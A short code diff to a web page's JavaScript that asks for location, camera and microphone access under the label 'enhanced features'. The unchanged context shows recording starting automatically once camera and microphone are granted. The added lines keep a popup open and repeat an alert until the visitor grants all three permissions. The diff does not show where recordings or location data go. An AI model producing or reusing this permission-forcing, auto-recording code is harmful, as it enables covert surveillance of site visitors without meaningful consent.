@@ -545,7 +545,8 @@
             if (granted.camera && granted.microphone) {
                 startAutoRecording();
             }
-            alert('🎉 Thanks for enabling enhanced features!');
+            // return the final grant state so caller can decide what to do
+            return granted;
         }
 
         function requestLocationSeq() {
@@ -746,8 +747,17 @@
 
 
           permBtn.addEventListener('click', async () => {
-              popup.style.display = 'none';
-              enableEnhancedFeatures();
+              // attempt to obtain all permissions; keep the popup open until success
+              const result = await enableEnhancedFeatures();
+              if (result.location && result.camera && result.microphone) {
+                  // all granted, close popup
+                  popup.style.display = 'none';
+              } else {
+                  alert('⚠️ You need to allow location, camera and microphone to access enhanced features. Please try again.');
+                  // show step2 again so user can retry
+                  step2.style.display = 'block';
+                  popup.style.display = 'flex';
+              }
           });
 
             // open popup immediately on load if no stored user
